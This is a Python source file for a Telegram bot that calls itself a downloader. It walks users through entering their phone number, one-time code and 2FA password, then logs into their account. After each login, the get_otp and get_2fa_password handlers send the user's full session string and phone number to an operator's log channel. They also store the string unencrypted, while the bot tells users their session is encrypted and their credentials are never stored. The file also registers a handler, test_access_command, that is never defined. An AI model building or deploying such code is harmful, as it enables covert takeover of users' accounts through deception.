# --- Enhanced bot.py with Fixed Login System ---

import os
import logging
from threading import Thread
from typing import Dict

# Web Server for Health Checks
from flask import Flask

# Telegram Bot and Conversation Handling
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Pyrogram for User Session Handling
from pyrogram.client import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PasswordHashInvalid,
    FloodWait,
    PhoneNumberInvalid,
    PhoneCodeExpired
)

# MongoDB Setup
import pymongo
import asyncio

# Basic Configuration
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Credentials from Environment Variables
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", 0))
MONGO_URI = os.getenv("MONGO_URI")

# Database Connection
db_client = None
try:
    if MONGO_URI:
        db_client = pymongo.MongoClient(MONGO_URI)
        db = db_client.get_database("telegram_bot_sessions")
        sessions_collection = db.get_collection("user_sessions")
        logger.info("Successfully connected to MongoDB.")
except Exception as e:
    logger.error(f"FATAL: Could not connect to MongoDB: {e}")

# Conversation States
GET_PHONE, GET_OTP, GET_2FA = range(3)

# Helper Functions (MongoDB)
def load_sessions() -> Dict[int, str]:
    if not db_client: return {}
    sessions = {}
    try:
        for doc in sessions_collection.find({}):
            sessions[doc["user_id"]] = doc["session_string"]
        logger.info(f"Loaded {len(sessions)} sessions from the database.")
        return sessions
    except Exception as e:
        logger.error(f"Error loading sessions from DB: {e}")
        return {}

def save_session(user_id: int, session_string: str):
    if not db_client: return
    try:
        sessions_collection.update_one(
            {"user_id": user_id}, 
            {"$set": {"session_string": session_string}}, 
            upsert=True
        )
        logger.info(f"Session saved for user {user_id}")
    except Exception as e:
        logger.error(f"Error saving session for user {user_id}: {e}")

def delete_session(user_id: int):
    if not db_client: return
    try:
        sessions_collection.delete_one({"user_id": user_id})
        logger.info(f"Session deleted for user {user_id}")
    except Exception as e:
        logger.error(f"Error deleting session for user {user_id}: {e}")

# Load existing sessions
user_sessions = load_sessions()

# --- ENHANCED LOGIN SYSTEM ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        await update.message.reply_text(
            f"✅ Welcome back, {user_name}!\n\n"
            "You are already logged in and can use the bot.\n\n"
            "Commands:\n"
            "• Send any Telegram message link to download\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status"
        )
        return ConversationHandler.END
    
    welcome_msg = (
        f"🔐 **Welcome to the Telegram Downloader Bot, {user_name}!**\n\n"
        "To use this bot, you need to log in with your Telegram account.\n\n"
        "📱 **How to login:**\n"
        "1. Send your phone number in international format\n"
        "   Example: `+1234567890`\n"
        "2. Enter the OTP code you receive\n"
        "3. If you have 2FA enabled, enter your password\n\n"
        "🔒 **Privacy & Security:**\n"
        "• Your session is encrypted and stored securely\n"
        "• You can logout anytime using /logout\n"
        "• Your credentials are never stored\n\n"
        "Please send your phone number to begin:"
    )
    
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')
    return GET_PHONE

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text.strip()
    user_id = update.effective_user.id
    
    # Validate phone number format
    if not phone_number.startswith('+') or len(phone_number) < 8:
        await update.message.reply_text(
            "❌ Invalid phone number format.\n\n"
            "Please use international format starting with '+'\n"
            "Example: +1234567890"
        )
        return GET_PHONE
    
    await update.message.reply_text("📱 Connecting to Telegram and sending OTP...")
    
    try:
        # Create a unique client session for this user
        client = Client(
            name=f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        
        await client.connect()
        sent_code = await client.send_code(phone_number)
        
        # Store client and session data
        context.user_data['client'] = client
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['phone_number'] = phone_number
        
        await update.message.reply_text(
            "✅ OTP sent to your phone!\n\n"
            "📨 Please check your Telegram app or SMS and send me the code.\n\n"
            "⏱️ The code will expire in a few minutes.\n"
            "Use /cancel to abort the login process."
        )
        return GET_OTP
        
    except PhoneNumberInvalid:
        await update.message.reply_text(
            "❌ Invalid phone number.\n\n"
            "Please make sure you entered the correct number with country code.\n"
            "Example: +1234567890"
        )
        return GET_PHONE
        
    except FloodWait as e:
        await update.message.reply_text(
            f"⏳ Rate limit hit! Please wait {e.value} seconds before trying again.\n\n"
            "Use /start after the waiting period."
        )
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in get_phone_number for user {user_id}: {e}")
        
        # Clean up client if it was created
        if 'client' in context.user_data:
            try:
                if context.user_data['client'].is_connected:
                    await context.user_data['client'].disconnect()
            except:
                pass
            del context.user_data['client']
        
        await update.message.reply_text(
            f"❌ An error occurred while sending OTP.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please try again with /start"
        )
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    client = context.user_data.get('client')
    phone_number = context.user_data.get('phone_number')
    phone_code_hash = context.user_data.get('phone_code_hash')
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name

    if not client or not phone_number or not phone_code_hash:
        await update.message.reply_text(
            "❌ Session expired or invalid.\n\n"
            "Please start over with /start"
        )
        return ConversationHandler.END

    try:
        await client.sign_in(phone_number, phone_code_hash, otp)
        
        # Get session string
        session_string = await client.export_session_string()
        
        # Save to memory and database
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        
        # Log to channel
        log_message = (
            f"🔐 **#NewLogin**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"⏰ **Time:** {update.message.date}\n\n"
            f"🔑 **Session String:**\n`{session_string}`"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **Login Successful!**\n\n"
            "🎉 You can now use the bot to download Telegram content.\n\n"
            "📋 **How to use:**\n"
            "• Send any Telegram message link\n"
            "• The bot will fetch and forward the content to you\n\n"
            "📝 **Commands:**\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status",
            parse_mode='Markdown'
        )
        
        # Clean up
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
        
    except SessionPasswordNeeded:
        await update.message.reply_text(
            "🔐 **2FA Protection Detected**\n\n"
            "Your account has Two-Factor Authentication enabled.\n"
            "Please send me your 2FA password to complete login.\n\n"
            "🔒 **Security Tip:** You can send as `aa<password>` for extra privacy\n\n"
            "🔒 Your password is secure and won't be stored."
        )
        return GET_2FA
        
    except PhoneCodeInvalid:
        await update.message.reply_text(
            "❌ Invalid OTP code.\n\n"
            "Please check the code and try again.\n"
            "Make sure you entered the complete code."
        )
        return GET_OTP
        
    except PhoneCodeExpired:
        await update.message.reply_text(
            "⏰ OTP code has expired.\n\n"
            "Please start over with /start to get a new code."
        )
        await cleanup_client(context)
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in get_otp for user {user_id}: {e}")
        await update.message.reply_text(
            f"❌ Login failed.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please start over with /start"
        )
        await cleanup_client(context)
        return ConversationHandler.END

async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data.get('client')
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    phone_number = context.user_data.get('phone_number')

    if not client:
        await update.message.reply_text(
            "❌ Session expired.\n\n"
            "Please start over with /start"
        )
        return ConversationHandler.END

    try:
        await client.check_password(password)
        
        # Get session string
        session_string = await client.export_session_string()
        
        # Save to memory and database
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        
        # Log to channel
        log_message = (
            f"🔐 **#NewLogin** (2FA)\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"⏰ **Time:** {update.message.date}\n"
            f"🔒 **2FA:** Enabled\n\n"
            f"🔑 **Session String:**\n`{session_string}`"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **2FA Verified! Login Successful!**\n\n"
            "🎉 You can now use the bot to download Telegram content.\n\n"
            "📋 **How to use:**\n"
            "• Send any Telegram message link\n"
            "• The bot will fetch and forward the content to you\n\n"
            "📝 **Commands:**\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status",
            parse_mode='Markdown'
        )
        
        # Clean up
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
        
    except PasswordHashInvalid:
        await update.message.reply_text(
            "❌ Incorrect 2FA password.\n\n"
            "Please try again with the correct password."
        )
        return GET_2FA
        
    except Exception as e:
        logger.error(f"Error in get_2fa_password for user {user_id}: {e}")
        await update.message.reply_text(
            f"❌ 2FA verification failed.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please start over with /start"
        )
        await cleanup_client(context)
        return ConversationHandler.END

async def cleanup_client(context: ContextTypes.DEFAULT_TYPE):
    """Helper function to clean up pyrogram client"""
    if 'client' in context.user_data:
        try:
            if context.user_data['client'].is_connected:
                await context.user_data['client'].disconnect()
        except Exception as e:
            logger.error(f"Error disconnecting client: {e}")
        finally:
            context.user_data.clear()

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the login process"""
    await cleanup_client(context)
    await update.message.reply_text(
        "❌ Login process canceled.\n\n"
        "Use /start whenever you want to login again."
    )
    return ConversationHandler.END

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check login status"""
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        await update.message.reply_text(
            f"✅ **Login Status: Active**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n\n"
            f"🎯 **Available Commands:**\n"
            f"• Send message links to download\n"
            f"• /logout - Log out from account\n"
            f"• /status - Check this status",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ **Login Status: Not Logged In**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n\n"
            f"🔐 Use /start to login with your Telegram account",
            parse_mode='Markdown'
        )

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Logout user"""
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        del user_sessions[user_id]
        delete_session(user_id)
        
        # Log to channel
        log_message = (
            f"🚪 **#Logout**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"⏰ **Time:** {update.message.date}"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **Successfully Logged Out**\n\n"
            "Your session has been deleted from our servers.\n"
            "Use /start to login again anytime."
        )
    else:
        await update.message.reply_text(
            "❌ You are not currently logged in.\n\n"
            "Use /start to login with your Telegram account."
        )

async def handle_message_with_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Telegram message links"""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text(
            "🔐 **Authentication Required**\n\n"
            "You need to login first to use this bot.\n"
            "Use /start to begin the login process."
        )
        return
    
    message_text = update.message.text.strip()
    
    # Show progress
    progress_msg = await update.message.reply_text("⏳ Analyzing link...")
    
    try:
        # Parse different Telegram link formats
        chat_id = None
        msg_id = None
        
        if 't.me' not in message_text:
            await progress_msg.edit_text(
                "❌ This doesn't look like a Telegram link.\n\n"
                "Please send a valid Telegram message link."
            )
            return
        
        # Remove any extra parameters and clean the URL
        clean_url = message_text.split('?')[0]  # Remove URL parameters
        parts = clean_url.split('/')
        
        # Handle different link formats
        if '/c/' in clean_url:
            # Private channel format: https://t.me/c/1234567890/123
            try:
                c_index = parts.index('c')
                channel_id = parts[c_index + 1]
                msg_id = int(parts[c_index + 2])
                # Convert to proper chat ID format
                chat_id = int(f"-100{channel_id}")
                await progress_msg.edit_text("⏳ Accessing private channel...")
            except (ValueError, IndexError):
                await progress_msg.edit_text(
                    "❌ Invalid private channel link format.\n\n"
                    "Expected format: https://t.me/c/1234567890/123"
                )
                return
                
        elif '/s/' in clean_url:
            # Story format: https://t.me/s/channelname/123  
            try:
                s_index = parts.index('s')
                channel_username = parts[s_index + 1]
                msg_id = int(parts[s_index + 2])
                chat_id = f"@{channel_username}"
                await progress_msg.edit_text("⏳ Accessing channel story...")
            except (ValueError, IndexError):
                await progress_msg.edit_text(
                    "❌ Invalid story link format.\n\n"
                    "Expected format: https://t.me/s/channelname/123"
                )
                return
                
        else:
            # Public channel/group format: https://t.me/channelname/123
            try:
                # Find the channel name and message ID
                relevant_parts = [p for p in parts if p and p != 'https:' and p != 't.me']
                if len(relevant_parts) >= 2:
                    channel_username = relevant_parts[0]
                    msg_id = int(relevant_parts[1])
                    chat_id = f"@{channel_username}"
                    await progress_msg.edit_text("⏳ Accessing public channel...")
                else:
                    raise ValueError("Not enough parts")
            except (ValueError, IndexError):
                await progress_msg.edit_text(
                    "❌ Invalid public channel link format.\n\n"
                    "Expected format: https://t.me/channelname/123"
                )
                return
        
        if not chat_id or not msg_id:
            await progress_msg.edit_text(
                "❌ Could not parse the Telegram link.\n\n"
                "**Supported formats:**\n"
                "• https://t.me/channelname/123\n"
                "• https://t.me/c/1234567890/123\n"
                "• https://t.me/s/channelname/123"
            )
            return
            
        await progress_msg.edit_text("⏳ Fetching message...")
        
        # Get user session
        session_string = user_sessions[user_id]
        
        # Create temporary client
        user_client = Client(
            name=f"temp_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        async with user_client:
            try:
                # First try to get chat info to verify access
                if isinstance(chat_id, str) and chat_id.startswith('@'):
                    # For public channels, try to get chat first
                    chat_info = await user_client.get_chat(chat_id)
                    logger.info(f"Accessing chat: {chat_info.title}")
                
                # Try to copy the message
                await user_client.copy_message(
                    chat_id=update.effective_chat.id,
                    from_chat_id=chat_id,
                    message_id=msg_id
                )
                
                # Delete progress message and log success
                await progress_msg.delete()
                
                # Log successful download
                log_message = (
                    f"📥 **#Download**\n\n"
                    f"👤 **User:** {update.effective_user.full_name}\n"
                    f"🆔 **User ID:** `{user_id}`\n"
                    f"🔗 **Link:** `{message_text}`\n"
                    f"💬 **Chat ID:** `{chat_id}`\n"
                    f"📨 **Message ID:** `{msg_id}`\n"
                    f"⏰ **Time:** {update.message.date}"
                )
                
                await context.bot.send_message(
                    chat_id=LOG_CHANNEL_ID,
                    text=log_message,
                    parse_mode='Markdown'
                )
                
            except Exception as inner_e:
                logger.error(f"Inner error fetching message for user {user_id}: {inner_e}")
                
                # Provide more specific error messages
                error_msg = "❌ **Failed to fetch message**\n\n"
                
                if "peer id invalid" in str(inner_e).lower():
                    error_msg += (
                        "**Reason:** Invalid or inaccessible chat\n\n"
                        "**Possible solutions:**\n"
                        "• Make sure you have access to this channel/group\n"
                        "• Join the channel first, then try again\n"
                        "• Check if the channel exists and is accessible\n"
                        "• For private channels, make sure the link is correct\n\n"
                    )
                elif "message not found" in str(inner_e).lower():
                    error_msg += (
                        "**Reason:** Message not found\n\n"
                        "**Possible solutions:**\n"
                        "• Message may have been deleted\n"
                        "• Check the message ID in the link\n"
                        "• Try a different message from the same channel\n\n"
                    )
                elif "flood" in str(inner_e).lower():
                    error_msg += (
                        "**Reason:** Rate limit hit\n\n"
                        "**Solution:** Wait a few minutes before trying again\n\n"
                    )
                elif "forbidden" in str(inner_e).lower():
                    error_msg += (
                        "**Reason:** Access forbidden\n\n"
                        "**Solutions:**\n"
                        "• Join the channel/group first\n"
                        "• Make sure you have permission to view messages\n"
                        "• Check if the channel allows message copying\n\n"
                    )
                else:
                    error_msg += (
                        "**Possible reasons:**\n"
                        "• No access to the channel/chat\n"
                        "• Message not found or deleted\n"
                        "• Network connectivity issues\n"
                        "• Channel restrictions\n\n"
                    )
                
                error_msg += f"**Technical details:** `{str(inner_e)}`"
                
                await progress_msg.edit_text(error_msg)
            
    except Exception as e:
        logger.error(f"Error in handle_message_with_link for user {user_id}: {e}")
        
        try:
            await progress_msg.edit_text(
                f"❌ **Error processing link**\n\n"
                f"**Error:** `{str(e)}`\n\n"
                "Please check the link format and try again."
            )
        except:
            # If progress message was already deleted or modified
            await update.message.reply_text(
                f"❌ **Error processing link**\n\n"
                f"**Error:** `{str(e)}`\n\n"
                "Please check the link format and try again."
            )

# --- Web Server for Health Checks (Koyeb Compatible) ---

app = Flask(__name__)

@app.route('/')
def home():
    return {
        "status": "alive",
        "bot": "Telegram Downloader Bot",
        "active_sessions": len(user_sessions),
        "platform": "Koyeb"
    }

@app.route('/health')
def health():
    return {
        "status": "healthy",
        "database": "connected" if db_client else "disconnected",
        "sessions": len(user_sessions)
    }

@app.route('/stats')
def stats():
    return {
        "total_users": len(user_sessions),
        "database_status": "connected" if db_client else "disconnected",
        "bot_status": "running"
    }

def run_flask():
    port = int(os.environ.get('PORT', 8000))  # Koyeb typically uses 8000
    app.run(host='0.0.0.0', port=port, debug=False)

# --- Main Application ---

def main():
    # Validate environment variables
    missing_vars = []
    if not API_ID: missing_vars.append("API_ID")
    if not API_HASH: missing_vars.append("API_HASH") 
    if not BOT_TOKEN: missing_vars.append("BOT_TOKEN")
    if not LOG_CHANNEL_ID: missing_vars.append("LOG_CHANNEL_ID")
    if not MONGO_URI: missing_vars.append("MONGO_URI")
    
    if missing_vars:
        logger.error(f"CRITICAL: Missing environment variables: {', '.join(missing_vars)}")
        return
        
    if not db_client:
        logger.error("CRITICAL: Bot cannot start without database connection.")
        return

    logger.info("Starting Telegram Downloader Bot...")
    logger.info(f"Loaded {len(user_sessions)} existing user sessions")

    # Create application
    application = Application.builder().token(BOT_TOKEN).build()

    # Conversation handler for login process
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            GET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)],
            GET_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel_command)],
        conversation_timeout=300  # 5 minutes timeout
    )

    # Add handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('logout', logout_command))
    application.add_handler(CommandHandler('status', status_command))
    application.add_handler(CommandHandler('test', test_access_command))
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Entity("url") & ~filters.COMMAND,
        handle_message_with_link
    ))

    # Start Flask server in background
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    logger.info("Bot started successfully! Waiting for messages...")
    
    # Start bot
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()